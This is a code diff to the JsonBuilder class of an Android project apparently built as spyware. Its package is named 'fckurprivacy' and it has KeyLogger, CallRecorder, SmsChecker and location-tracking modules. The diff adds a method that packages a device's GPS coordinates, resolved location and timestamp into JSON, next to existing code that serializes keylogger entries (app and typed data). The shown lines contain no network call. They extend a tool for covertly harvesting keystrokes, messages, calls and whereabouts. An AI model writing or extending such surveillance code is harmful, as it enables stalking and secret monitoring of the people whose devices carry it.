@@ -5,6 +5,7 @@ import com.vergermiya.harevost.fckurprivacy.CallRecorder.CallRecordJSon;
 import com.vergermiya.harevost.fckurprivacy.InfoChecker.InfoJson;
 import com.vergermiya.harevost.fckurprivacy.KeyLogger.KeyLogJson;
 import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsJson;
+import com.vergermiya.harevost.fckurprivacy.locationChecker.LocationJson;
 
 import org.json.JSONArray;
 import org.json.JSONException;
@@ -105,6 +106,25 @@ public class JsonBuilder {
             jsonText.key("Date").value(keyLogJson.getLogDate());
             jsonText.key("App").value(keyLogJson.getLogApp());
             jsonText.key("Data").value(keyLogJson.getLogData());
+
+            jsonText.endObject();
+
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+        return jsonText;
+    }
+
+    public static JSONStringer buildLocJson(LocationJson locationJson) {
+        JSONStringer jsonText = new JSONStringer();
+        try {
+            jsonText.object();
+
+            jsonText.key("Date").value(locationJson.getDate());
+            jsonText.key("Latitude").value(locationJson.getLatitude());
+            jsonText.key("Longitude").value(locationJson.getLongitude());
+            jsonText.key("Location").value(locationJson.getRealLoc());
+            jsonText.key("Type").value(locationJson.getType());
 
             jsonText.endObject();
 
